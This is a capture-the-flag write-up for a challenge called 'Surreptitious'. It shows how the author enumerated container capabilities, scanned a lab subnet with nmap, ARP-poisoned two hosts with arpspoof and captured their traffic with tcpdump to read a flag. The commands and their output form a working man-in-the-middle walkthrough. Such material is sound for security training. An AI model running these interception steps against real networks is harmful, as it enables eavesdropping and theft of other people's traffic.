# Write-up Surreptitious

## Connect to machine through ssh to simpleuser user account
## `sudo -l` to identify you are actually root on the machine (which is a container)
```
User simpleuser may run the following commands on 1fe4763887c9:
    (ALL) ALL
```

## indentify ip_forward flag is set
```
$ cat /proc/sys/net/ipv4/ip_forward
1
```

## identify we have some nice capabilities `cap_net_raw`
```
[root@78241d3a3c31 simpleuser]# cat /proc/$$/status | grep Cap
CapInh: 0000000000000000
CapPrm: 00000000800425fb
CapEff: 00000000800425fb
CapBnd: 00000000800425fb
CapAmb: 0000000000000000
[root@78241d3a3c31 simpleuser]# capsh --decode=00000000800425fb
0x00000000800425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_setfcap
```
This means we can do ARP poisonning.

## `sudo -s` to elevate privileges
## install some nice tools:
- `iproute` for retrieving current ip adress, subnet and interfaces
- `nmap` for scanning the backend subnet
- `dsniff` for arpspoof
- `net-tools` for displaying arp tables
- `tcpdump` for dumping intercepted traffic
# scan the backend network
Identify backend subnet is `10.89.0.3/24`:
```
[root@78241d3a3c31 simpleuser]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
2: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 1a:a7:cf:9b:c4:f7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.89.0.3/24 brd 10.89.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::18a7:cfff:fe9b:c4f7/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
```
scan the subnet and identify 4 machines:
```
[root@78241d3a3c31 simpleuser]# nmap 10.89.0.3/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 12:25 UTC
Nmap scan report for 10.89.0.1
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
MAC Address: C6:F9:21:D2:BD:E6 (Unknown)

Nmap scan report for 10.89.0.2
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 22:3C:D7:81:E0:64 (Unknown)

Nmap scan report for 10.89.0.4
Host is up (0.0000030s latency).
All 1000 scanned ports on 10.89.0.4 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 46:E8:11:A2:D8:D5 (Unknown)

Nmap scan report for 78241d3a3c31 (10.89.0.3)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (4 hosts up) scanned in 2.21 seconds
```
We identify:
- the gateway `10.89.0.1` with port 2222 open
- a server `10.89.0.2` with port 4444 open
- our machine `10.89.0.3` with port 22 open
- another machine `10.89.0.4` with no open port

## intercept communication
We assume another machine is talking to the server.
We will run an arp spoofing attack to intercept communication and on a second session capture the traffic with tcpdump.
```
[root@78241d3a3c31 simpleuser]# arpspoof -i eth0 -c both -t 10.89.0.2 -r 10.89.0.4                                     
1a:a7:cf:9b:c4:f7 22:3c:d7:81:e0:64 0806 42: arp reply 10.89.0.4 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 46:e8:11:a2:d8:d5 0806 42: arp reply 10.89.0.2 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 22:3c:d7:81:e0:64 0806 42: arp reply 10.89.0.4 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 46:e8:11:a2:d8:d5 0806 42: arp reply 10.89.0.2 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 22:3c:d7:81:e0:64 0806 42: arp reply 10.89.0.4 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 46:e8:11:a2:d8:d5 0806 42: arp reply 10.89.0.2 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 22:3c:d7:81:e0:64 0806 42: arp reply 10.89.0.4 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 46:e8:11:a2:d8:d5 0806 42: arp reply 10.89.0.2 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 22:3c:d7:81:e0:64 0806 42: arp reply 10.89.0.4 is-at 1a:a7:cf:9b:c4:f7                               
1a:a7:cf:9b:c4:f7 46:e8:11:a2:d8:d5 0806 42: arp reply 10.89.0.2 is-at 1a:a7:cf:9b:c4:f7
```
Other session:
```
[root@78241d3a3c31 simpleuser]# tcpdump -w output.pcap
dropped privs to tcpdump
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
^C71 packets captured
71 packets received by filter
0 packets dropped by kernel
```

Retrieve through scp the file and open in a nice graphical Wireshark UI.
```
[root@78241d3a3c31 simpleuser]# chmod 777 output.pcap
```
```
$ scp -P 2222 simpleuser@localhost:output.pcap .
simpleuser@localhost's password: 
output.pcap                                                                          100% 5152     3.8MB/s   00:00
```

With wireshark gui, look at TCP communcations on port 4444 and see flag transitting.
